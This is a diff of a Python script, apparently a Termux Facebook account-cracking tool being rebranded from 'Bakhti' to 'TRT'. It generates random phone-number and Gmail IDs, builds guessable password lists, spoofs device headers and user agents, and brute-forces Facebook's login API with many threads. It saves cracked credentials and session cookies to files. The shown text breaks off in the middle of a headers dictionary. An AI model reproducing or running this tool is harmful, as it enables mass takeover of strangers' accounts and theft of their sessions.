@@ -1,86 +1,88 @@
-#Open source by Z - MUKHLIS 
+# Open Source By Mr Mafia
+# Give credit Before Use
 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
-    import os,requests,json,time,re,random,sys,uuid,string,subprocess
-    from string import *
-    import bs4, subprocess,random
-    #import dz
-    from concurrent.futures import ThreadPoolExecutor as tred
-    from bs4 import BeautifulSoup as sop
-    from bs4 import BeautifulSoup
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess
+	from string import *
+	import bs4
+	#import dz
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from bs4 import BeautifulSoup as sop
+	from bs4 import BeautifulSoup
 except ModuleNotFoundError: 
-    print('\n Installing missing modules ...')
-    os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python Bakhti.py')
+	print('\n Installing missing modules ...')
+	os.system('pip install requests bs4 futures==2 > /dev/null')
+	os.system('python trt.py')
 	
-os.system('xdg-open https://www.facebook.com/profile.php?id=100028629604446')
+print('[•] Join Whatsap Group')
+os.system('xdg-open https://chat.whatsapp.com/B8pdA0uNxH88NnC38CIgVP')
 
 try:
-    prox= requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/proxies.txt').text
-    open('proxies.txt','w').write(proxies)
+	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
+	open('proxies.txt','w').write(proxies)
 except Exception as e:
-    print('\033[1;35mCHECKING FOR UPDATE...')
+	print('\x1b[1;95m[√] LOADING...')
 	
 proxies=open('proxies.txt','r').read().splitlines()
 
 
 android_models=[]
 try:
-    xx = requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/strings.txt').text.splitlines()
-    for line in xx:
-        android_models.append(line)
+	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
+	for line in xx:
+		android_models.append(line)
 except:pass
 
 usr=[]
 try:
-    xd=requests.get('https://raw.githubusercontent.com/kpk-Fire/data/main/ua.txt').text.splitlines()
-    for us in xd:
-        usr.append(us)
+	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
+	for us in xd:
+		usr.append(us)
 except: pass
 
 gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
 ugen=[]
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12','13'])
-    c=f' en-us; {str(gt)}'
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['6','7','8','9','10','11','12','13'])
+	c=f' en-us; {str(gt)}'
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
 for agent in range(10000):
-    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-    b=random.choice(['6','7','8','9','10','11','12','13'])
-    c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/533.1'
-    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(fullagnt)
+	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+	b=random.choice(['6','7','8','9','10','11','12','13'])
+	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/533.1'
+	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	ugen.append(fullagnt)
 rug=[]
 for nt in range(10000):
-    rr=random.randint
-    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    rx=random.randrange(1, 999)
-    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-    rug.append(xx)
+	rr=random.randint
+	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	rx=random.randrange(1, 999)
+	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+	rug.append(xx)
 ruz=[]
 for mtc in range(10000):
-    rr=random.randint
-    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
-    ruz.append(xd)
+	rr=random.randint
+	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
+	ruz.append(xd)
 	
 #new ua
 ugen=[]
@@ -147,125 +149,24 @@ device = {
         'fbsv':fbsv,
         'fbca':fbca,
         'fbdm':fbdm}
-os.system('xdg-open https://www.facebook.com/profile.php?id=100028629604446')  
-pwx=[]
-W = '\033[97;1m'
-R = '\033[91;1m'
-G = '\033[92;1m'
-Y = '\033[93;1m'
-B = '\033[94;1m'
-P = '\033[95;1m'
-S = '\033[96;1m'
-N = '\x1b[0m'
-PURPLE ='\x1b[38;5;46m'
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-BLACK="\033[1;30m"
-EXTRA ='\x1b[38;5;208m'
-        
-def main_apv():
 
-    imt="Y000=="
-
-    ak="BAKHTI="
-
-    os.system('clear')
-
-    print(logo)
-
-    try:
-
-        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
-
-    except IOError:
-
-        os.system("clear")
-
-        print(logo)
-        print ("YOUR TOKEN IS NOT APROVAL")     
-        print ("")
-
-        myid=uuid.uuid4().hex[:10].upper()
-
-        print ("  YOUR KEY : "+ak+myid+imt)
-
-        print ("•───────────────────────────────────────•")
-
-        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
-
-        kok.write(myid+imt)
-
-        kok.close()
-
-        print ("")
-
-        print ("")
-
-        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
-
-        print ("•───────────────────────────────────────•")
-
-        time.sleep(3.5)
-
-        tks = 'Hello%20Bakhti%sir,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
-
-        os.system('am start https://wa.me/+994404869343?text=' + tks)
-
-        
-
-    r1=requests.get("https://raw.githubusercontent.com/PATHAN-404/BaBa-Bakhti/main/Approval%20txt").text
-
-    if key1 in r1:
-
-        menu()
-
-    else:
-
-        os.system("clear")
-
-        print(logo)
-        print ("    \033[1;32mYOUR KEY : "+ak+key1)     
-        time.sleep(3.5)
-
-        tks = 'Hello%20Bakhti%20sir,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
-
-        os.system('am start https://wa.me/+994404869343?text=' + tks)        
-        
-        
-                
-        
-        
-        
-        
-        
-        
-        
-        
-
-logo=(f"""{WHITE}                                                      
-  \033[1;32m@@@@@@@    @@@@@@   @@@  @@@  @@@  @@@  @@@@@@@  @@@  
-  \033[1;32m@@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@  @@@@@@@  @@@  
-  \033[1;35m@@!  @@@  @@!  @@@  @@!  !@@  @@!  @@@    @@!    @@!  
-  \033[1;35m!@   @!@  !@!  @!@  !@!  @!!  !@!  @!@    !@!    !@!  
-  \033[1;33m@!@!@!@   @!@!@!@!  @!@@!@!   @!@!@!@!    @!!    !!@  
-  \033[1;33m!!!@!!!!  !!!@!!!!  !!@!!!    !!!@!!!!    !!!    !!!  
-  \033[1;34m!!:  !!!  !!:  !!!  !!: :!!   !!:  !!!    !!:    !!:  
-  \033[1;34m:!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!    :!:    :!:  
-    \033[1;31m: ::::  ::   :::   ::  :::  ::   :::     ::     ::  
-  \033[1;31m:: : ::    :   : :   :   :::   :   : :     :     :    
-\33[47;1m\33[1;91m[ PRO ]   \33[00;1m\33[41;1m   \33[1;97m[ POWERED BY BAKHTI ]   \33[00;1m\33[47;1m   \33[1;91m[ PRO ]\33[00;1m
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{WHITE}[\033[1;33m⍣\033[1;33m{WHITE}\033[1;34m]{WHITE} OWNER        :  Bakhti Rahman
-[\033[1;33m⍣\033[1;33m{WHITE}]{WHITE} FaceBook     :  Bakhti Rahman 
-[\033[1;33m⍣\033[1;33m{WHITE}]{WHITE} Version      :  {RED}1.0
-{WHITE}[\033[1;33m⍣\033[1;33m{WHITE}]{WHITE} TOOL Status  :  Paid
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m""")
+logo=("""\033[1;91m
+        \033[1;97m88888888888 8888888b. 88888888888 
+          \033[1;97m  888     888   Y88b    888     
+        \033[1;97m    888     888    888    888     
+        \033[1;97m    888     888   d88P    888     
+        \033[1;97m    888     8888888P"     888     
+         \033[1;97m   888     888 T88b      888     
+         \033[1;97m   888     888  T88b     888     
+          \033[1;97m  888     888   T88b    888\033[1;32m       XD
+\033[1;37m--------------------------------------------------
+[~] Author   : Ramzan Tanha
+[~] Facebook : Muhammad Adnan
+[~] Tool     : Paid
+[~] Version  : 30.0
+\033[1;37m----------------------------------------------""")
 def linex():
-    print('\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
+	print('\033[1;37m----------------------------------------------')
 def clear():
 	os.system('clear')
 	print(logo)
@@ -382,7 +283,7 @@ def menu():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python Bakhti.py')
+				os.system('python trt.py')
 			elif xd in ['2','02']:
 				pak()
 			elif xd in ['3','03']:
@@ -391,7 +292,7 @@ def menu():
 				#dz._login()
 				exit()
 			elif xd in ['4','04']:
-			#	os.system('xdg-open https://chat.whatsapp.com/GRCLEUOREdd1SDMTX1TsKk')
+				os.system('xdg-open https://chat.whatsapp.com/GRCLEUOREdd1SDMTX1TsKk')
 				menu()
 			elif xd in ['0','00']:
 				exit(' Thanks for use 🥰 ')
@@ -418,7 +319,7 @@ def pak():
 		for nmbr in range(limit):
 			nmp = ''.join(random.choice(string.digits) for _ in range(7))
 			user.append(nmp)
-		with tred(max_workers=30) as BAKHTI:	
+		with tred(max_workers=30) as TRT:	
 			clear()
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
@@ -444,24 +345,24 @@ def pak():
 				elif pcs in ['8','08']:
 					passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
 				if mthd in ['1','01']:
-					BAKHTI.submit(lina1,ids,passlist)
+					TRT.submit(trt1,ids,passlist)
 				if mthd in ['2','02']:
-					BAKHTI.submit(lina2,ids,passlist)
+					TRT.submit(trt2,ids,passlist)
 				if mthd in ['3','03']:
-					BAKHTI.submit(lina3,ids,passlist)
+					TRT.submit(trt3,ids,passlist)
 				if mthd in ['4','04']:
-					BAKHTI.submit(lina4,ids,passlist)
+					TRT.submit(trt4,ids,passlist)
 				if mthd in ['5','05']:
-					BAKHTI.submit(lina5,ids,passlist)
+					TRT.submit(trt5,ids,passlist)
 				if mthd in ['6','06']:
-					BAKHTI.submit(lina6,ids,passlist)
+					TRT.submit(trt6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Bakhti.py')
+		os.system('python trt.py')
 
 def gmail():
 		os.system('rm -rf .re.txt')
@@ -502,7 +403,7 @@ def gmail():
 				mail = ''.join(random.choice(string.digits) for _ in range(4))
 				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 			fo = open('.re.txt', 'r').read().splitlines()
-		with tred(max_workers=30) as BAKHTI:
+		with tred(max_workers=30) as TRT:
 			total = str(len(fo))
 			clear()
 			print(' Total ids : \033[1;32m'+total+f' ')
@@ -526,30 +427,30 @@ def gmail():
 				else:
 					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
 				if mthd in ['1','01']:
-					BAKHTI.submit(lina1,ids,passlist)
+					TRT.submit(trt1,ids,passlist)
 				if mthd in ['2','02']:
-					BAKHTI.submit(lina2,ids,passlist)
+					TRT.submit(trt2,ids,passlist)
 				if mthd in ['3','03']:
-					BAKHTI.submit(lina3,ids,passlist)
+					TRT.submit(trt3,ids,passlist)
 				if mthd in ['4','04']:
-					BAKHTI.submit(lina4,ids,passlist)
+					TRT.submit(trt4,ids,passlist)
 				if mthd in ['5','05']:
-					BAKHTI.submit(lina5,ids,passlist)
+					TRT.submit(trt5,ids,passlist)
 				if mthd in ['6','06']:
-					BAKHTI.submit(lina6,ids,passlist)
+					TRT.submit(trt6,ids,passlist)
 		print('\033[1;37m')
 		linex()
 		print(' The process has completed')
 		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 		linex()
 		input(' Press enter to back ')
-		os.system('python Bakhti.py')
+		os.system('python trt.py')
 #b-api method
 #1method
 def api1(ids,names,passlist):
 		try:
 			global ok,loop
-			sys.stdout.write('\r\r\033[1;37m [BAKHTI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			fn = names.split(' ')[0]
 			try:
 				ln = names.split(' ')[1]
@@ -599,43 +500,33 @@ def api1(ids,names,passlist):
 				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
 				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 				head = {
-				    'authority': 'x.facebook.com',
-                    'method': 'GET', 
-                    'path': '/',
-                    'scheme': 'https', 
-                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'accept-language': 'en-US,en;q=0.9',
-                    'cache-control': 'max-age=0',
-                    'dpr': '2',
-                    'sec-ch-prefers-color-scheme': 'light',
-                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-                    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
-                    'sec-ch-ua-mobile': '?1',
-                    'sec-ch-ua-model': '"LDN-L21"',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-ch-ua-platform-version': '"8.0.0"',
-                    'sec-fetch-dest': 'document',
-                    'sec-fetch-mode': 'navigate',
-                    'sec-fetch-site': 'none',
-                    'sec-fetch-user': '?1',
-                    'upgrade-insecure-requests': '1',
-                    'user-agent':pro,}
-				url = 'https://x.facebook.com/method/auth.login'
+				'content-type':'application/x-www-form-urlencoded',
+				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-type':'unknown',
+				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+				'user-agent':ua_string,
+				'x-fb-net-hni':str(random.randint(2e4,4e4)),
+				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+				'x-fb-connection-quality':'EXCELLENT',
+				'x-fb-friendly-name':'authenticate',
+				'accept-encoding':'gzip, deflate',
+				'x-fb-http-engine':	'Liger'}
+				url = 'https://b-api.facebook.com/method/auth.login'
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [BAKHTI-OK] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BAKHTI-OK.txt','a').write(ids+'|'+pas+'\n')
+					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
-						open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
 						break
 				else:
 					continue
@@ -649,7 +540,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BAKHTI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -697,26 +588,26 @@ def api2(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/BAKHTI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BAKHTI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BAKHTI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -728,7 +619,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BAKHTI-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -782,47 +673,40 @@ def api3(ids,names,passlist):
 "generate_machine_id": "1",
 "fb_api_req_friendly_name": "authenticate",}
                         headers={
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
